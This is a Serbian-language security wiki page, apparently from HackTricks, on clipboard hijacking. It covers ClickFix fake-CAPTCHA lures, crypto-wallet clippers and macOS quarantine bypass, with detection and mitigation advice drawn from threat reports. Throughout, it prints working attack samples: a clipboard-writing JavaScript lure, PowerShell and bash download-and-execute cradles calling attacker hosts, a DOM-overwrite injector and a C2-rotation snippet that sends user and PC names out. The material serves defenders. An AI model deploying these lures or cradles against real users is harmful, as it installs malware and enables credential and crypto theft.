# Napadi otmice clipboarda (Pastejacking)

> „Nikada ne lepite ništa što sami niste kopirali.“ – stari, ali i dalje važeći savet

## Pregled

Otmica clipboarda – poznata i kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju i lepe komande bez provere njihovog sadržaja. Zlonamerna veb-stranica (ili bilo koji kontekst sa podrškom za JavaScript, kao što su Electron ili Desktop aplikacija) programski postavlja tekst pod kontrolom napadača u sistemski clipboard. Žrtve se podstiču, obično pažljivo konstruisanim uputstvima socijalnog inženjeringa, da pritisnu **Win + R** (dijalog Run), **Win + X** (Quick Access / PowerShell) ili otvore terminal i *nalepi* sadržaj clipboarda, čime se odmah izvršavaju proizvoljne komande.

Pošto se **ne preuzima nijedna datoteka i ne otvara nijedan prilog**, ova tehnika zaobilazi većinu bezbednosnih kontrola e-pošte i veb-sadržaja koje nadgledaju priloge, makroe ili direktno izvršavanje komandi. Zbog toga je napad popularan u phishing kampanjama koje isporučuju uobičajene porodice malware-a, kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper-i za zamenu adresa walleta

Druga varijanta **otmice clipboarda** uopšte ne lepi komande: čeka da žrtva kopira **adresu cryptocurrency walleta**, a zatim je neprimetno zamenjuje adresom pod kontrolom napadača neposredno pre lepljenja. Ovo je naročito efikasno kod dugih formata wallet adresa, jer korisnici često proveravaju samo početne i završne znakove.<sup>[[8]](#references)</sup>

Uobičajene karakteristike iz stvarnog sveta:
- **Thin loader + nested payload**: vidljiva aplikacija/exe izgleda kao legitimni alat za trgovanje ili ostvarivanje „profita“, dok je pravi clipper sakriven dublje u paketu (na primer .NET loader koji pokreće nested Rust payload).
- **Regex-driven replacement**: malware pronalazi stringove kao što su `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` ili čak generičke **44-character Solana-like** stringove i prepisuje ih wallet adresama napadača.
- **Wallet rotation at scale**: moderni Windows uzorci mogu sadržati **hiljade** zamenskih wallet adresa po valuti umesto jedne statične adrese, čime se smanjuje narušavanje reputacije walleta nakon svake krađe.<sup>[[8]](#references)</sup>

### Tok Windows clippera

Uobičajena implementacija je skriveni prozor registrovan pomoću **`AddClipboardFormatListener`**. Prilikom svakog ažuriranja clipboarda, malware obično poziva:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → pristup trenutnim podacima clipboarda.
- **`GetClipboardData`** → čitanje teksta.
- **`EmptyClipboard`** + **`SetClipboardData`** → zamena stringa walleta vrednošću napadača.

Minimalni hunting regexi koji se često viđaju u clipperima:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-level persistence je dovoljna za ostvarivanje uticaja. Jedan uočeni obrazac je:<sup>[[8]](#references)</sup>
- Kopiranje payload-a u **`%APPDATA%\silke\silke.exe`**
- Kreiranje **Startup-folder LNK** datoteke u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideje za detekciju:
- Procesi koji neprekidno pozivaju clipboard API-je, istovremeno upisujući podatke u `%APPDATA%` i korisnički **Startup** folder.
- Kreiranje novih LNK/izvršnih datoteka, nakon čega slede izmene wallet-adresa u clipboard-u.
- Arhive ili paketi lažnog softvera koji sadrže mnogo nekorišćenih datoteka i mali launcher koji pokreće ugnježdeni binarni fajl.

### macOS social-engineered uklanjanje quarantine-a + LaunchAgent persistence

Na macOS-u, neke kampanje distribuiraju pomoćni program **`unlocker.command`** i upućuju žrtvu da klikne desnim tasterom miša → **Open** ako Gatekeeper prijavi da je aplikacija oštećena ili potiče od neidentifikovanog developera. Skripta jednostavno uklanja quarantine i pokreće obližnju `.app` datoteku:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Ovo **nije** Gatekeeper exploit; to je **socijalno-inženjerski bypass quarantine mehanizma** koji zloupotrebljava činjenicu da Gatekeeper odluke zavise od `com.apple.quarantine` xattr-a.<sup>[[8]](#references)</sup>

Nakon izvršavanja, clipper može da opstane kao trenutni korisnik upisivanjem:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper skripta
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent sa `RunAtLoad` i `KeepAlive`

Korisna defanzivna informacija jeste da neki uzorci implementiraju **self-healing watchdog** koji ponovo upisuje LaunchAgent i wrapper na svakih približno 30 sekundi. Ako prvo uklonite plist **bez zaustavljanja aktivnog procesa**, malware može odmah da ga ponovo kreira.<sup>[[8]](#references)</sup> Bezbedan redosled čišćenja:
1. Zaustavite aktivni clipper proces.
2. Unload-ujte/obrišite LaunchAgent plist.
3. Obrišite `~/launch.sh` i kopirani payload.

### Napomena o distribuciji: lažna reputacija kao multiplikator efekta

Za ovu familiju malware-a, sam malware može ostati tehnički jednostavan, dok **distribucioni sloj** obavlja glavni deo posla: lažni GitHub stars/forks, SourceForge reviews/downloads, YouTube komentari na tutorijalima i pregledi, kao i benigno izgledajući VirusTotal komentari/votes koriste se da bi binary izgledao pouzdano pre izvršavanja.<sup>[[8]](#references)</sup>

## Prisilna dugmad za kopiranje i skriveni payload-i (macOS one-liners)

Neki macOS infostealers kloniraju installer sajtove (npr. Homebrew) i **prisiljavaju korisnika da upotrebi dugme „Copy“** kako ne bi mogao da označi samo vidljivi tekst. Clipboard unos sadrži očekivanu installer komandu i dodatni Base64 payload (npr. `...; echo <b64> | base64 -d | sh`), pa jedno lepljenje izvršava oba dela, dok UI skriva dodatnu fazu.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje koristile su `document.execCommand('copy')`, dok se novije oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## ClickFix / ClearFake tok

1. Korisnik posećuje typosquatted ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Ubačeni **ClearFake** JavaScript poziva pomoćnu funkciju `unsecuredCopyToClipboard()` koja neprimetno skladišti Base64-kodirani PowerShell one-liner u clipboard.
3. HTML uputstva govore žrtvi: *„Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da biste rešili problem.“*
4. `powershell.exe` se izvršava i preuzima arhivu koja sadrži legitimnu izvršnu datoteku i zlonamerni DLL (klasični DLL sideloading).
5. Loader dešifruje dodatne faze, ubacuje shellcode i instalira persistence (npr. scheduled task) – što na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Primer NetSupport RAT lanca
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimni Java WebStart) pretražuje svoj direktorijum u potrazi za `msvcp140.dll`.
* Zlonamerni DLL dinamički razrešava API-je pomoću **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) putem **curl.exe**, dešifruje ih koristeći rolling XOR ključ `"https://google.com/"`, ubacuje završni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` pomoću **curl.exe**
2. Izvršava JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → postavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer kroz MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Poziv **mshta** pokreće skriveni PowerShell script koji preuzima `PartyContinued.exe`, izdvaja `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` pomoću `extrac32` i konkatenacije fajlova i na kraju pokreće `.a3x` script koji eksfiltrira browser credentials na `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK sa rotirajućim C2 (PureHVNC)

Neke ClickFix kampanje u potpunosti preskaču preuzimanje fajlova i upućuju žrtve da nalepi one-liner koji preuzima i izvršava JavaScript putem WSH-a, uspostavlja persistence i svakodnevno rotira C2. Primer uočenog lanca:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne karakteristike
- Obfuscated URL se obrće tokom izvršavanja kako bi se sprečila površna analiza.
- JavaScript se održava putem Startup LNK-a (WScript/CScript) i bira C2 na osnovu trenutnog dana, što omogućava brzu rotaciju domena.<sup>[[3]](#references)</sup>

Minimalni JS fragment koji se koristi za rotaciju C2 servera prema datumu:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sledeća faza obično pokreće loader koji uspostavlja persistence i preuzima RAT (npr. PureHVNC), često koristeći TLS pinning na hardcoded certificate i deljenje saobraćaja na delove.<sup>[[3]](#references)</sup>

Ideje za detekciju specifične za ovu varijantu
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
- Startup artifacts: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, koji poziva WScript/CScript sa JS putanjom pod `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i command-line telemetrija koja sadrži `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponovljeno izvršavanje `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin payload-ima za prosleđivanje dugih skripti bez dugih command line-ova.
- Scheduled Tasks koji naknadno izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` u okviru task/path-a koji izgleda kao updater (npr. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2 hostname-ovi i URL-ovi koji se rotiraju svakog dana, sa obrascem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korelisati clipboard write događaje nakon kojih slede Win+R paste i neposredno izvršavanje `powershell.exe`.

Blue-teams mogu kombinovati clipboard, process-creation i registry telemetriju kako bi precizno identifikovali zloupotrebu pastejacking-a:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – tražite neuobičajene Base64 / obfuscated unose.
* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe`, a `NewProcessName` je u skupu { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranje fajlova pod `%LocalAppData%\Microsoft\Windows\WinX\` ili u privremenim folderima neposredno pre sumnjivog 4688 događaja.
* EDR clipboard senzori (ako postoje) – korelišite `Clipboard Write` sa neposrednim pokretanjem novog PowerShell procesa.

## IUAM-style stranice za verifikaciju (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Nedavne kampanje masovno proizvode lažne CDN/browser verification stranice ("Just a moment…", u IUAM stilu), koje primoravaju korisnike da kopiraju OS-specifične komande iz svog clipboard-a u native console. Time se izvršavanje premešta iz browser sandbox-a i funkcioniše na Windows-u i macOS-u.<sup>[[4]](#references)</sup>

Ključne karakteristike stranica generisanih builder-om
- Detekcija OS-a putem `navigator.userAgent` radi prilagođavanja payload-a (Windows PowerShell/CMD naspram macOS Terminal-a). Opciono korišćenje decoy/no-op komandi za nepodržane OS-ove radi održavanja iluzije.
- Automatsko kopiranje u clipboard pri bezazlenim UI radnjama (checkbox/Copy), dok se vidljivi tekst može razlikovati od sadržaja clipboard-a.
- Blokiranje mobilnih uređaja i popover sa detaljnim uputstvima: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opciono obfuscation i single-file injector za prepisivanje DOM-a kompromitovanog sajta pomoću verification UI-ja stilizovanog Tailwind-om (nije potrebna registracija novog domena).<sup>[[4]](#references)</sup>

Primer: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence početnog pokretanja
- Koristi `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kako bi se izvršavanje nastavilo nakon zatvaranja terminala, čime se smanjuju vidljivi artefakti.<sup>[[4]](#references)</sup>

Preuzimanje stranice na kompromitovanim sajtovima
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideje za detekciju i hunting specifične za IUAM-style lures
- Web: Stranice koje povezuju Clipboard API sa verification widgetima; nepodudaranje prikazanog teksta i clipboard payload-a; grananje na osnovu `navigator.userAgent`; Tailwind + zamena single-page sadržaja u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon interakcije sa browserom; batch/MSI installer-i pokrenuti iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm pokreće `bash`/`curl`/`base64 -d` sa `nohup` u blizini browser događaja; background jobs koji preživljavaju zatvaranje terminala.
- Korelišite `RunMRU` Win+R istoriju i clipboard writes sa naknadnim kreiranjem console procesa.

Pogledajte i sledeće za prateće tehnike

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolucije (ClearFake, Scarlet Goldfinch)

- ClearFake nastavlja da kompromituje WordPress sajtove i ubacuje loader JavaScript koji ulančava spoljne hostove (Cloudflare Workers, GitHub/jsDelivr), pa čak i blockchain “etherhiding” pozive (npr. POST zahteve ka Binance Smart Chain API endpointima kao što je `bsc-testnet.drpc[.]org`) radi preuzimanja aktuelne lure logike. Nedavni overlay-i u velikoj meri koriste fake CAPTCHA-e koji korisnicima nalažu da kopiraju/ubace one-liner (T1204.004), umesto da bilo šta preuzimaju.<sup>[[6]](#references)</sup>
- Initial execution se sve češće delegira potpisanim script hostovima/LOLBAS alatima. Lanci iz januara 2026. zamenili su raniju upotrebu `mshta` ugrađenim `SyncAppvPublishingServer.vbs`, izvršenim preko `WScript.exe`, uz prosleđivanje argumenata sličnih PowerShell-u sa aliasima/wildcard-ima radi preuzimanja udaljenog sadržaja:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` je potpisan i obično ga koristi App-V; u kombinaciji sa `WScript.exe` i neuobičajenim argumentima (`gal`/`gcm` aliasi, cmdlet-i sa džoker znakovima, jsDelivr URL-ovi) postaje visokosignalni LOLBAS stage za ClearFake.<sup>[[6]](#references)</sup>
- Lažni CAPTCHA payloadi iz februara 2026. vratili su se čistim PowerShell download cradle-ovima. Dva aktivna primera:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Prvi lanac je grabber u memoriji `iex(irm ...)`; drugi koristi `WinHttp.WinHttpRequest.5.1`, upisuje privremeni `.ps1`, a zatim ga pokreće sa `-ep bypass` u skrivenom prozoru.<sup>[[6]](#references)</sup>

Saveti za detekciju/lov na ove varijante
- Linija procesa: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles neposredno nakon upisa u clipboard/Win+R.
- Ključne reči komandne linije: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domeni ili sirovi IP `iex(irm ...)` obrasci.
- Mreža: izlazne veze ka CDN worker hostovima ili blockchain RPC endpointima iz script hostova/PowerShell-a neposredno nakon web pregledanja.
- Fajl/registry: kreiranje privremenog `.ps1` fajla u `%TEMP%` uz RunMRU zapise koji sadrže ove one-linere; blokirati/upozoriti na signed-script LOLBAS (`WScript`/`cscript`/`mshta`) koji se izvršava sa eksternim URL-ovima ili obfuskovanim alias stringovima.

## ClickFix tradecraft iz juna 2026: paste telemetrija, lažni komentari verifikacije i LOLBin lančanje

Nedavna Red Canary telemetrija pokazuje da stabilan indikator **nije jedna tačna komanda**, već kombinacija **paste-and-run radnje uz pomoć korisnika**, **trusted interpretera/LOLBins**, **obfuskovanih flagova**, **remote retrieval-a** i **neposrednog izvršavanja**.<sup>[[7]](#references)</sup>

### Značajni obrasci operatora

- **Telemetrija potvrde paste radnje**: neki payload-i pozivaju `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` pre stvarne faze. Ovo potvrđuje interakciju korisnika uz kratak i neupadljiv prozor.
- **Lažni komentari verifikacije**: PowerShell one-liners mogu dodati stringove kao što je `# Security check ✔️ I'm not a robot Verification ID: 138105`, tako da komanda i nakon lepljenja u Run / `cmd.exe` / PowerShell istoriju i dalje izgleda kao da je povezana sa CAPTCHA-om.
- **Dinamička rekonstrukcija URL-a**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` izbegava statički URL u komandnoj liniji, ali i dalje izvršava download-and-execute u memoriji.
- **Maskirano izvršavanje instalera**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` zloupotrebljava neuobičajena velika i mala slova i znakove nalik Unicode znakovima u flagovima kako bi zaobišlo krhke detekcije, a da i dalje liči na `msiexec.exe`.
- **LOLBin lanci sa escape-ovanim caret znakovima**: `cmd.exe` može sakriti ključne reči pomoću `^` escape-ova (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), pokrenuti ugnježdeni shell minimizovan, sačuvati sadržaj napadača sa bezazlenom ekstenzijom kao što je `.pdf`, a zatim ga izvršiti putem `mshta`.<sup>[[7]](#references)</sup>
## Mere zaštite

1. Ojačavanje browser-a – onemogućiti write-access za clipboard (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevati korisnički gest.
2. Security awareness – naučiti korisnike da *otkucaju* osetljive komande ili da ih najpre nalepе u text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih one-linera.
4. Mrežne kontrole – blokirati izlazne zahteve ka poznatim pastejacking i malware C2 domenima.

## Povezane tehnike

* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix pristup nakon namamljivanja korisnika na malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Popravite klik: sprečavanje ClickFix attack vector-a](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Ispod čiste zavese: od RAT-a do builder-a i coder-a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Factory: prvo otkrivanje IUAM ClickFix generatora](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, godina Infostealer-a](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: februar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: jun 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Od zvezdica do upvote-ova: lažna reputacija koja podstiče crypto clipboard hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
